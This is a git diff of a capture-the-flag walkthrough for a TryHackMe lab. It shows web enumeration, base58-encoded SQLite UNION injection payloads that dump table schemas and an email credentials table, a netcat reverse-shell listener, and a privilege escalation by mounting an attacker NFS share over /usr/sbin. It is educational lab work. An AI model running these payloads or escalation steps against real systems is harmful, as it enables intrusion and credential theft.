@@ -1,5 +1,5 @@
 <h1 align="center">DX2: Hell´s Kitchen</h1>
-<p align="center">2025, October 18 - 2026, January 5  &nbsp; .  &nbsp; Access this challenge <a href="https://tryhackme.com/room/dx2hellskitchen">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/31800efd-4cdf-43c2-a3a0-0baa70ad62bf"></p>
+<p align="center">2025, October 18 - 2026, January 17  &nbsp; •  &nbsp; Access this challenge <a href="https://tryhackme.com/room/dx2hellskitchen">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/31800efd-4cdf-43c2-a3a0-0baa70ad62bf"></p>
 
 
 <h2>Task 1 . Investigate the server of an associate</h2>
@@ -117,48 +117,6 @@ PORT     STATE SERVICE VERSION
 
 <img width="1296" height="848" alt="image" src="https://github.com/user-attachments/assets/77a45ebd-089b-443b-b125-4a3d43d32a87" />
 
-
-<br>
-<br>
-<br>
-<h1 align="center">Web Vulnerability Scanning</h1>
-
-```bash
-:~/DX2HellsKitchen# nikto -h http://dx2.thm
-- Nikto v2.1.5
----------------------------------------------------------------------------
-+ Target IP:          xx.xx.xxx.xxx
-+ Target Hostname:    dx2.thm
-+ Target Port:        80
-+ Start Time:         2026-01-05 xx:xx:xx (GMT0)
----------------------------------------------------------------------------
-+ Server: No banner retrieved
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ No CGI Directories found (use '-C all' to force check all possible dirs)
-+ 6544 items checked: 0 error(s) and 1 item(s) reported on remote host
-+ End Time:           2026-01-05 xx:xx:xx (GMT0) (8 seconds)
----------------------------------------------------------------------------
-+ 1 host(s) tested
-```
-
-```bash
-:~/DX2HellsKitchen# nikto -h http://dx2.thm:4346
-- Nikto v2.1.5
----------------------------------------------------------------------------
-+ Target IP:          xx.xx.xxx.xxx
-+ Target Hostname:    dx2.thm
-+ Target Port:        4346
-+ Start Time:         2026-01-05 xx:xx:xx (GMT0)
----------------------------------------------------------------------------
-+ Server: No banner retrieved
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ No CGI Directories found (use '-C all' to force check all possible dirs)
-+ 6544 items checked: 0 error(s) and 1 item(s) reported on remote host
-+ End Time:           2026-01-05 xx:xx:xx (GMT0) (9 seconds)
----------------------------------------------------------------------------
-+ 1 host(s) tested
-```
-
 <br>
 <h1 align="center">Directory and File Enumeration</h1>
 
@@ -173,26 +131,6 @@ Target: http://dx2.thm/
 [xx:xx:xx] 404 -   14B  - /static/dump.sql
 
 Task Completed
-```
-
-```bash
-:~/DX2HellsKitchen# gobuster dir -u http://dx2.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -x txt,html,php,sql
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://dx2.thm/
-[+] Method:                  GET
-[+] Threads:                 60
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              sql,txt,html,php
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/about-us             (Status: 200) [Size: 1315]
 ```
 
 ```bash
@@ -219,7 +157,6 @@ Finished
 ===============================================================
 ```
 
-
 ```bash
 :~/DX2HellsKitchen# dirsearch -u http://dx2.thm:4346/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 ...
@@ -239,11 +176,15 @@ Task Completed
 
 <br>
 <br>
+<br>
 
 <img width="1185" height="777" alt="image" src="https://github.com/user-attachments/assets/81e5d6e9-d32d-44ed-b08c-803956b94f18" />
 
 <br>
 <br>
+<br>
+<p>dx2.thm</p>
+
 
 ```bash
 :~/DX2HellsKitchen# curl dx2.thm
@@ -269,6 +210,9 @@ Task Completed
     </body>
 </html>
 ```
+
+<br>
+<p>dx2.thm/guest-book</p>
 
 ```bash
 :~/DX2HellsKitchen# curl dx2.thm/guest-book
@@ -343,6 +287,11 @@ Hippolyta Hall    Los Angeles
 <br>
 <p>/static/check-room.js</p>
 
+<img width="1116" height="442" alt="image" src="https://github.com/user-attachments/assets/b41f8097-f3a0-419f-9a7d-4107fa8066aa" />
+
+<br>
+<br>
+
 ```bash
 fetch('/api/rooms-available').then(response => response.text()).then(number => {
     const bookingBtn = document.querySelector("#booking");
@@ -363,103 +312,111 @@ fetch('/api/rooms-available').then(response => response.text()).then(number => {
 
 <br>
 <br>
-
-<img width="1116" height="442" alt="image" src="https://github.com/user-attachments/assets/b41f8097-f3a0-419f-9a7d-4107fa8066aa" />
-
 <br>
-<br>
-<br>
-<p>Unfortunately the hotel is currently fully booked. Please try again later!<br>
-Tom hotel is owned and operated by the Rentons ... Gilberto Renton ... Sanda Renton ...</p>
+<p>Book Your Room<br>dx2.thm/new-booking<br><em>Unfortunately the hotel is currently fully booked. Please try again later!</em><br><br>
+About Us<br>dx2.thm/about-us<br><em>Tom hotel is owned and operated by the Rentons ... Gilberto Renton ... Sanda Renton ...</em></p>
 
 <img width="1241" height="770" alt="image" src="https://github.com/user-attachments/assets/d9247e47-9c11-46ba-aa36-fc6d5a44431a" />
 
+<br>
+<br>
+<br>
 <p>dx2.thm/new-booking</p>
 
 <img width="1054" height="276" alt="image" src="https://github.com/user-attachments/assets/8616e766-dcdd-441b-9872-a4e869653085" />
 
 <br>
 <br>
-
+<br>
+<p>Identify <strong>/static/new-booking.js</strong> in the source code.</p>
 <img width="1058" height="359" alt="image" src="https://github.com/user-attachments/assets/ede43fb3-685e-4029-843d-90100b02b760" />
 
 <br>
 <br>
-
+<br>
+<p>Inspect <strong>/new-booking</strong> and identify <strong>booking_key</strong> from <strong>booking-info</strong>.</p>
 <img width="1112" height="575" alt="image" src="https://github.com/user-attachments/assets/c8fdba14-33a1-4e57-a46e-c26ea071ad1a" />
 
 <br>
 <br>
 <br>
-<p align="left">booking_key : ...<<br>/api/booking-info?booking_key=</p>
-
-
-```bash
-function getCookie(name) {
-    const value = `; ${document.cookie}`;
-    const parts = value.split(`; ${name}=`);
-    if (parts.length === 2) return parts.pop().split(';').shift();
-}
-
-fetch('/api/booking-info?booking_key=' + getCookie("BOOKING_KEY")).then(response => response.json()).then(data => {
-    document.querySelector("#rooms").value = data.room_num;
-    document.querySelector("#nights").value = data.days;
-});
-```
 
 <img width="1109" height="487" alt="image" src="https://github.com/user-attachments/assets/d02d78b4-ef87-4367-be16-17fc82b6f647" />
 
 <br>
 <br>
 <br>
-<p>dx2.thm/static/new-booking.js</p>
-
-<img width="1053" height="462" alt="image" src="https://github.com/user-attachments/assets/0957775c-c534-45ab-9590-3b90016e8a19" />
-
-<br>
-<br>
+<p>Check <strong>/static/new-booking.js</strong></p>
 
 <img width="1059" height="186" alt="image" src="https://github.com/user-attachments/assets/46974c89-39da-4261-ad89-87ebe4bfb84b" />
 
 <br>
 <br>
 <br>
-<p>BOOKING_KEY:"..."</p>
 
-<img width="1058" height="365" alt="image" src="https://github.com/user-attachments/assets/ac7d0900-b240-400a-b400-da5d4fe40095" />
+<p>Decode the <strong>booking_key</strong> value.</p>
+<img width="1355" height="187" alt="image" src="https://github.com/user-attachments/assets/4ea08649-ed4a-413f-9096-85c42afccc81" />
 
-<br>
-<br>
-<br>
-<p>BOOKING_KEY:"..." Base58 decoded is <strong>>BOOKING_KEY:"booking_id:9622295"</strong></p>
-
-<img width="843" height="213" alt="image" src="https://github.com/user-attachments/assets/c7d427d3-12ed-458b-a905-d72994e18009" />
 
 <br>
 <br>
-<br>
-<p>CyberChef<br>... = booking_id:9220187</p>
+<h1 align="center">Exploitation  •  SQL Injection</h1>
 
-<img width="1226" height="241" alt="image" src="https://github.com/user-attachments/assets/8e82a259-94a3-4285-8bd0-74f2b012ea41" />
-
-<br>
-<br>
-<br>
+<p><code>booking_id:1' UNION SELECT 1,2 -- -</code></p>
 
 ```bash
-:~/DX2HellsKitchen#curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT 1,sqlite_version()  -- -"|base58); echo ' '
+:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=ApfkkDrFctMBrXvW3fJPqtgiyDhrqKLGAWqaQpgwBY91n3Pa
+{"room_num":"1","days":"2"}
+```
+
+<br>
+<br>
+<p><code>booking_id:' UNION SELECT 1,sqlite_version()  -- -</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQLite version <code>3.42.0</code></p>
+
+```bash
+:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT 1,sqlite_version()  -- -"|base58); echo ' '
 {"room_num":"1","days":"3.42.0"}
 ```
+
+<br>
+<br>
+<p><code>booking_id:1' UNION SELECT 1,sqlite_version() -- -</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQLite version <code>3.42.0</code></p>
+
+```bash
+:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=2DM1mNyoCy8z33ctQNHz7tsjQhQwGGJ7BfAkBoWA2fLSzeW1rezWoJm7LdfsGxVyg8EnY
+{"room_num":"1","days":"3.42.0"}
+```
+
+<br>
+<br>
+<p><code>booking_id:' UNION SELECT 1,sql FROM sqlite_schema -- -</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TABLE <code>bookings_temp</code> containing fields <code>booking_id</code>, <code>room_num</code>, and <code>days</code></p>
 
 ```bash
 :~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT 1,sql FROM sqlite_schema -- -"|base58); echo ' '
 {"room_num":"1","days":"CREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)"} 
 ```
 
+<br>
+<br>
+<p><code>booking_id:1' UNION SELECT 1,sql FROM sqlite_schema -- -</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TABLE <code>bookings_temp</code> containing fields <code>booking_id</code>, <code>room_num</code>, and <code>days</code></p>
+
+```bash
+:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=3fcdDXstvQBMjWHxTTY4rSpJ6j94tbFcTa7mQHUhBQKPjaSNqvhXzbC5knNsCQxwVfve8CVBUgAQk
+{"room_num":"1","days":"CREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)"}
+```
+
+<br>
+<br>
+<p><code>booking_id:' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite%' -- -</code></p>
+
 ```bash
 :~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite%' -- -"|base58); echo ' '
 {"room_num":"1","days":"email_access,reservations,bookings_temp"}
 ```
+
+<br>
+<br>
+<p><code>curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:1' UNION SELECT GROUP_CONCAT(guest_name || ':' || email_username || ':' || email_password, '\n'),2 FROM email_access;-- -"|base58); echo ' '</code> OR the command below</p>
 
 ```bash
 :~/DX2HellsKitchen#curl -s http://dx2.thm/api/booking-info?booking_key=28uzZhxu35QQSAfpeyWEk2NXWtaUD4vnoC9KJf9EdWtAvxfpsqMMMGVpik7aQW3BwB1GcbH66hZ92zK7z6Y4ex789wBYP61pVpF9mXiLhERNz5zR9TseLJpjTTVZXSnSJTYvLSgCekVS2GcfyqtjBPTZD2TiCULD1xansd7DGJtNUbVHQZxzQ | jq
@@ -469,97 +426,113 @@ fetch('/api/booking-info?booking_key=' + getCookie("BOOKING_KEY")).then(response
 }
 ```
 
+<br>
+<br>
+<p><code>booking_id:' UNION SELECT group_concat(email_username), group_concat(EMAIL_pASSWORD) from email_access -- -</code></p>
+
 ```bash
-:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT group_concat(email_username), group_concat(EMAIL_pASSWORD) from email_accesS -- -"|base58); echo ' '
+:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT group_concat(email_username), group_concat(EMAIL_pASSWORD) from email_access -- -"|base58); echo ' '
 {"room_num":"NEVER LOGGED IN,NEVER LOGGED IN,NEVER LOGGED IN,-------,NEVER LOGGED IN,NEVER LOGGED IN","days":",,,-------------,,"} 
 ```
 
+<br>
+<br>
+<p><code>booking_id:' UNION SELECT email_username, email_password from email_access LIMIT 1 OFFSET 1 -- -</code></p>
 
 ```bash
 :~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT email_username, email_password from email_access LIMIT 1 OFFSET 1 -- -"|base58); echo ' '
 {"room_num":"-------","days":"-------------"}
 ```
 
-<img width="1385" height="360" alt="image" src="https://github.com/user-attachments/assets/e7cadcc2-2f9c-4e8a-978a-1e93241ffda6" />
-
 <br>
 <br>
-<br>
-
-```bash
-:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=ApfkkDrFctMBrXvW3fJPqtgiyDhrqKLGAWqaQpgwBY91n3Pa
-{"room_num":"1","days":"2"}
-```
-
-```bash
-:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=2DM1mNyoCy8z33ctQNHz7tsjQhQwGGJ7BfAkBoWA2fLSzeW1rezWoJm7LdfsGxVyg8EnY
-{"room_num":"1","days":"3.42.0"}
-```
-
-<img width="1053" height="93" alt="image" src="https://github.com/user-attachments/assets/81ca5a52-2985-4a48-aa1e-7013e4f41b1d" />
-
-<br>
-<br>
-<br>
-
-```bash
-:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=3fcdDXstvQBMjWHxTTY4rSpJ6j94tbFcTa7mQHUhBQKPjaSNqvhXzbC5knNsCQxwVfve8CVBUgAQk
-{"room_num":"1","days":"CREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)"}
-```
-
-<img width="1051" height="69" alt="image" src="https://github.com/user-attachments/assets/8ddc1c11-75d6-4d70-acda-ab7d69e940de" />
-
-<br>
-<br>
-<br>
+<p><code>booking_id:1' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -</code></p>
 
 ```bash
 :~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=3HN9EcFJMeWBq54x2Tk9DEGmpUKqvuGUDMnicRgmKLtQCKGoDqqz3iCpif7zzSjFD3qmzCJjZCP1uBpnTEsvgSs4oSALTFZ5FiRyV5aJfBz2MSBKDr5tk2nxZ3tYduYKgRvgakxTrRzntzzmdV4bmM1RVnzUCZAeVTocrhWZBuH428
 {"room_num":"1","days":"email_access,reservations,bookings_temp"}
 ```
 
-<img width="1060" height="73" alt="image" src="https://github.com/user-attachments/assets/11686a04-6ff9-43f9-bbec-1c825b69b204" />
-
 <br>
 <br>
-<br>
+<p><code>booking_id:1' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='email_access' -- -</code></p>
 
 ```bash
 :~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=ACnMHD6J1XxN7kQu7LfMQWxJfpuVYz2wM2CXcUt398ns3iDxcvLbJ7mcbRKsN1Uk3p8MDfdmnsunVpCev7yTL4AaS7zvCz6ZtckRNq6yVA49Uy2QT4Rx7LKXTdpJiM8QsdNHpFuyma6Ugtkygvyka7ZQT2C3P7tQ
 {"room_num":"1","days":"CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)"}
 ```
 
-<img width="1055" height="71" alt="image" src="https://github.com/user-attachments/assets/daa6b723-497c-4037-a9d2-0472c8f379ca" />
+<br>
+<br>
+<p><code>booking_id:1' UNION SELECT group_concat(email_username),group_concat(email_password) FROM email_access -- -</code></p>
 
-<br>
-<br>
-<br>
-<p>
-
-- ------- : -------------</p>
+<p>------- : -------------</p>
 
 ```bash
 :~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=e7Zicyo9Kq2pk6Ta8E7kEFnsVi7p2VAXKYEfVHZGpseKw9x3o8pAxGhdUhy6EYJanhRv9aMwyu8CKq9maeLfk8QHjEALv2j2B8WLyWypECM8R7bWhWBqf4GpXnyAcicrNuza7Qeb7m4riuWuWc
 {"room_num":"NEVER LOGGED IN,NEVER LOGGED IN,NEVER LOGGED IN,-------,NEVER LOGGED IN,NEVER LOGGED IN","days":",,,-------------,,"}
 ```
 
+<br>
+<br>
+<p><code>booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -</code></p>
 
+```bash
+:~/DX2HellsKitchen# curl -s http://xx.xxx.xx.xx/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -" | base58)
+{"room_num":"CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)
+  \\nCREATE TABLE reservations (guest_name TEXT, room_num INTEGER, days_remaining INTEGER)
+  \\nCREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)",
+"days":"2"
+}
+```
+
+<br>
+<br>
+<p><code>booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -</code></p>
+
+```bash
+:~/DX2HellsKitchen# curl -s http://xx.xxx.xx.xx/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -" | base58) | jq -r
+{
+  "room_num": "CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)
+   \\nCREATE TABLE reservations (guest_name TEXT, room_num INTEGER, days_remaining INTEGER)
+   \\nCREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)",
+  "days": "2"
+}
+```
+
+<br>
+<br>
+<p><code>booking_id:2238907' UNION SELECT GROUP_CONCAT(guest_name || ':' || email_username || ':' || email_password,'\n'),2 FROM email_access;-- -</code></p>
+
+```bash
+:~/DX2HellsKitchen# curl -s http://xx.xxx.xx.xx/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(guest_name || ':' || email_username || ':' || email_password,'\n'),2 FROM email_access;-- -" | base58) | jq -r
+{
+  "room_num": "Gully Foyle:NEVER LOGGED IN:
+  \\nGabriel Syme:NEVER LOGGED IN:
+  \\nOberst Enzian:NEVER LOGGED IN:
+  \\nPaul Denton:-------:-------------
+  \\nSmilla Jasperson:NEVER LOGGED IN:
+  \\nHippolyta Hall:NEVER LOGGED IN:",
+  "days": "2"
+}
+```
+
+
+<br>
 <br>
 <h1 align="center">Web 4346</h1>
-<p>
+<p>Log in dx2.thm:4346</p>
 
-- log in :4346</p>
-
-<img width="1036" height="693" alt="image" src="https://github.com/user-attachments/assets/384fde30-94d2-4eb7-9bc3-b4a557a8a6c4" />
+<img width="1107" height="345" alt="image" src="https://github.com/user-attachments/assets/dac51eb9-9467-4dd1-908e-e99dc51391ef" />
 
 <br>
 <br>
-<h3 align="center">beautifier.io</h3>
-
+<p>View code source.</p>
 <img width="1204" height="281" alt="image" src="https://github.com/user-attachments/assets/b93846cd-00b1-410e-9501-d03e0717ad06" />
 
 <br>
 <br>
+<p>View it beautified.</p>
 
 <img width="1341" height="482" alt="image" src="https://github.com/user-attachments/assets/8e615991-314e-4287-b2d6-6b9e56685f0f" />
 
@@ -591,14 +564,11 @@ fetch('/api/booking-info?booking_key=' + getCookie("BOOKING_KEY")).then(response
 
 <br>
 <br>
-
-<img width="1107" height="345" alt="image" src="https://github.com/user-attachments/assets/dac51eb9-9467-4dd1-908e-e99dc51391ef" />
-
+<h1 align="center">Email Enumeration</h1>
 <br>
-<br>
+<p>Read the emails.<br>Click over the subject to see another email.</p>
 
-<img width="1204" height="711" alt="image" src="https://github.com/user-attachments/assets/a32ff553-37a1-4cb2-a638-fc98f32cfa9b" />
-
+<img width="1036" height="693" alt="image" src="https://github.com/user-attachments/assets/384fde30-94d2-4eb7-9bc3-b4a557a8a6c4" />
 
 <br>
 <br>
@@ -624,9 +594,71 @@ fetch('/api/booking-info?booking_key=' + getCookie("BOOKING_KEY")).then(response
 <img width="1204" height="722" alt="image" src="https://github.com/user-attachments/assets/9b796e44-8221-4810-8836-35af8a63e398" />
 
 <br>
-<rb>
 <br>
-<h1></h1>
+<br>
+<p>You can also read the emails using the following approach:</p>
+
+<br>
+<p>
+
+- navigate to /api/message?message_id=1</p>
+
+<img width="1039" height="120" alt="image" src="https://github.com/user-attachments/assets/edb87adf-5308-432b-83df-d495260d9382" />
+
+<br>
+<br>
+
+<img width="814" height="281" alt="image" src="https://github.com/user-attachments/assets/3bed9e95-767d-4db8-b0a7-817a279acef4" />
+
+<br>
+<br>
+<p>
+
+- navigate to /api/message?message_id=2</p>
+
+<img width="1039" height="89" alt="image" src="https://github.com/user-attachments/assets/b73af3d9-6ac1-44fb-aa2c-61ded4d8e2d9" />
+
+<br>
+<br>
+
+<img width="834" height="484" alt="image" src="https://github.com/user-attachments/assets/054a79eb-7c43-45b2-bdae-f2697586d5d0" />
+
+<br>
+<br>
+<p>
+
+- navigate to /api/message?message_id=3</p>
+
+<img width="1039" height="71" alt="image" src="https://github.com/user-attachments/assets/3191102a-11bb-427b-a0f9-b51058e4e73f" />
+
+<br>
+<br>
+
+<img width="829" height="321" alt="image" src="https://github.com/user-attachments/assets/5d65880f-e476-400a-a55b-f2e98171db05" />
+
+<br>
+<br>
+<p>
+
+- navigate to /api/message?message_id=4</p>
+
+<img width="825" height="400" alt="image" src="https://github.com/user-attachments/assets/23b6eb36-a4d1-4adf-b348-bff093f833af" />
+
+<br>
+<br>
+<p>
+
+- navigate to/api/message?message_id=5</p>
+
+<img width="826" height="352" alt="image" src="https://github.com/user-attachments/assets/f67f93b7-0584-4841-8fad-b01d09dc4cc6" />
+
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
 
 ```bash
 :~/DX2HellsKitchen# cat script.py
@@ -666,12 +698,12 @@ def tamper(payload, **kwargs):
 <h3 align="center">WebSockets history</h3>
 <p>
 
-- navigate to Burp Suite<br>
-- Proxy<br>
-- WebSockets history<br>
-- right-click over an item<br>
-- Send to Repeater<br>
-- customize<br>
+- Launch Burp Suite<br>
+- Click <strong>Proxy</strong><br>
+- Click <strong>WebSockets history</strong><br>
+- Right-click over an item<br>
+- Send to <strong>Repeater</strong><br>
+- Customize<br>
 - Send</p>
 
 <img width="1162" height="132" alt="image" src="https://github.com/user-attachments/assets/da357631-9efe-414c-b474-119ece74e164" />
@@ -716,90 +748,6 @@ Sat 18 Oct 2025 10:15:26 PM UTC
 ```
 
 
-<br>
-<p>
-
-- navigated to http://xx.xxx.xx.xx:4346/api/message?message_id=1</p>
-
-<img width="1039" height="120" alt="image" src="https://github.com/user-attachments/assets/edb87adf-5308-432b-83df-d495260d9382" />
-
-<br>
-<br>
-
-<img width="814" height="281" alt="image" src="https://github.com/user-attachments/assets/3bed9e95-767d-4db8-b0a7-817a279acef4" />
-
-<br>
-<br>
-<p>
-
-- navigated to http://xx.xxx.xx.xx:4346/api/message?message_id=2</p>
-
-<img width="1039" height="89" alt="image" src="https://github.com/user-attachments/assets/b73af3d9-6ac1-44fb-aa2c-61ded4d8e2d9" />
-
-<br>
-<br>
-
-<img width="834" height="484" alt="image" src="https://github.com/user-attachments/assets/054a79eb-7c43-45b2-bdae-f2697586d5d0" />
-
-<br>
-<br>
-<p>
-
-- navigated to http://xx.xxx.xx.xx:4346/api/message?message_id=3</p>
-
-<img width="1039" height="71" alt="image" src="https://github.com/user-attachments/assets/3191102a-11bb-427b-a0f9-b51058e4e73f" />
-
-<br>
-<br>
-
-<img width="829" height="321" alt="image" src="https://github.com/user-attachments/assets/5d65880f-e476-400a-a55b-f2e98171db05" />
-
-<br>
-<br>
-<p>
-
-- navigated to http://xx.xxx.xx.xx:4346/api/message?message_id=4</p>
-
-<img width="825" height="400" alt="image" src="https://github.com/user-attachments/assets/23b6eb36-a4d1-4adf-b348-bff093f833af" />
-
-<br>
-<br>
-<p>
-
-- navigated to http://xx.xxx.xx.xx:4346/api/message?message_id=5</p>
-
-<img width="826" height="352" alt="image" src="https://github.com/user-attachments/assets/f67f93b7-0584-4841-8fad-b01d09dc4cc6" />
-
-<br>
-<br>
-<br>
-
-
-```bash
-:~/DX2HellsKitchen# curl -s http://xx.xxx.xx.xx/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -" | base58)
-{"room_num":"CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)\\nCREATE TABLE reservations (guest_name TEXT, room_num INTEGER, days_remaining INTEGER)\\nCREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)","days":"2"}
-```
-
-```bash
-:~/DX2HellsKitchen# curl -s http://xx.xxx.xx.xx/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -" | base58) | jq -r
-{
-  "room_num": "CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)\\nCREATE TABLE reservations (guest_name TEXT, room_num INTEGER, days_remaining INTEGER)\\nCREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)",
-  "days": "2"
-}
-```
-
-```bash
-:~/DX2HellsKitchen# curl -s http://xx.xxx.xx.xx/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(guest_name || ':' || email_username || ':' || email_password,'\n'),2 FROM email_access;-- -" | base58) | jq -r
-{
-  "room_num": "Gully Foyle:NEVER LOGGED IN:\\nGabriel Syme:NEVER LOGGED IN:\\nOberst Enzian:NEVER LOGGED IN:\\nPaul Denton:-------:-------------\\nSmilla Jasperson:NEVER LOGGED IN:\\nHippolyta Hall:NEVER LOGGED IN:",
-  "days": "2"
-}
-```
-
-```bash
-:~/DX2HellsKitchen# curl -s http://xx.xxx.xx.xx/api/booking-info?booking_key=$(echo -n "booking_id:1138907' UNION SELECT GROUP_CONCAT( guest_name || '] : [' || email_username || '] : [' || email_password,'\n'),2 FROM email_access;-- -" | base58)
-```
-
 
 <img width="1273" height="139" alt="image" src="https://github.com/user-attachments/assets/aa9e3df7-c556-4f4b-a26c-88bb30483d8a" />
 
@@ -822,6 +770,7 @@ Sat 18 Oct 2025 10:15:26 PM UTC
 <br>
 <br>
 <br>
+<h1 align="center">Shell as gilbert</h1>
 
 ```bash
 :~$ sudo nc -nlvp 443
@@ -891,6 +840,10 @@ gilbert@tonhotel:~$
 <br>
 <br>
 <br>
+<br>
+<br>
+<br>
+<h1 align="center">Shell as sandra</h1>
 
 ```bash
 gilbert@tonhotel:/$ su sandra
@@ -942,6 +895,24 @@ thm{•••••••••••••••••••••••••�
 <br>
 
 ```bash
+sandra@tonhotel:~$ ls -la Pictures/
+...
+-rw-rw---- 1 sandra sandra 32637 Sep  7  2023 boss.jpg
+```
+
+<br>
+<p>
+
+- transfer <strong>boss.jpg</strong> to your VM and identify <strong>jojo</strong>´s password</p>
+
+<img width="994" height="446" alt="image" src="https://github.com/user-attachments/assets/a33a43d9-9e7a-49cd-9c02-9c30287fe708" />
+
+<br>
+<br>
+<br>
+<h1 align="center">Shell as jojo</h1>
+
+```bash
 sandra@tonhotel:/home$ su jojo
 Password:
 $ whoami
@@ -956,20 +927,84 @@ User jojo may run the following commands on tonhotel:
 jojo@tonhotel:~$
 ```
 
-<img width="994" height="446" alt="image" src="https://github.com/user-attachments/assets/a33a43d9-9e7a-49cd-9c02-9c30287fe708" />
-
 <br>
 <br>
 <br>
-
+<p>Create a share in your attack virtual machine</p>
 
 ```bash
-...
+:~/DX2HellsKitchen# mkdir /tmp/share
+```
+
+<br>
+<p>change the ownership of the sare you created to a low-privilege user <code>nobody</code> and group <code>nogroup</code>.</p>
+
+```bash
+:~/DX2HellsKitchen# sudo chown nobody:nogroup /tmp/share
+```
+
+```bash
+:~/DX2HellsKitchen# sudo chmod 777 /tmp/share
+```
+
+```bash
+:~/DX2HellsKitchen# sudo chmod +s /tmp/share
+```
+
+
+<br>
+<p>Update <strong>/etc/nsf.conf</strong> to open on port=443</p>
+
+```bash
+[nfsd]
+port=443
+```
+
+<br>
+<p>Add the share created to /etc/exports</p>
+
+```bash
+:~/DX2HellsKitchen# sudo bash -c 'echo "/tmp/share 10.0.0.0/8(rw)" >> /etc/exports'
+```
+
+```bash
+:~/DX2HellsKitchen# sudo exportfs -a
+```
+
+```bash
+:~/DX2HellsKitchen# sudo systemctl restart nfs-kernel-server
+```
+
+<br>
+<br>
+
+```bash
 jojo@tonhotel:~$ sudo /usr/sbin/mount.nfs -o port=443 xxx.xxx.xxx.xx:/tmp/share /usr/sbin
 [sudo] password for jojo:
 ```
 
+```bash
